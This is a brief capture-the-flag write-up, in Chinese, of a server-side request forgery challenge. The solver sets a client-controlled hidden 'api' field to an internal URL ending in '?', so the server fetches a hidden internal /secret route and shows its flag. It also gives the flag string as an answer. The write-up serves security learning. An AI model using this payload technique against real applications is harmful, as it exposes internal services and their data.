# Server-Side Request Forgery

## 题目简述

登录后的模块查询会从表单读取 `api` 和 `code`，再执行 `requests.get(f"{api}{code}.json")`。虽然页面把 `api` 做成 hidden input，它仍完全由客户端控制；Docker 网络中另有只对内部开放的服务，其 `/secret` 路由返回第三阶段 flag。

## 解题过程

先注册普通账户并登录，然后拦截模块查询请求。把表单改为：

```text
api=http://internal/secret?
code=x
```

服务端最终访问：

```text
http://internal/secret?x.json
```

追加的 `.json` 被放进查询字符串，不会改变 Flask 路径 `/secret`。内部服务返回 HTTP 200，外层应用又把响应正文渲染到页面：

```json
{"secret":"grey{this_is_an_internal_secret}"}
```

因此第三阶段 flag 为 `grey{this_is_an_internal_secret}`。

## 方法总结

hidden input 只影响页面展示，不构成信任边界。看到服务端把用户提供的 URL 前缀传给 HTTP 客户端时，应检查内部 DNS 名称、拼接后缀和重定向行为；本题利用 `?` 把强制追加的 `.json` 降为无害查询参数，从而准确命中内部路径。
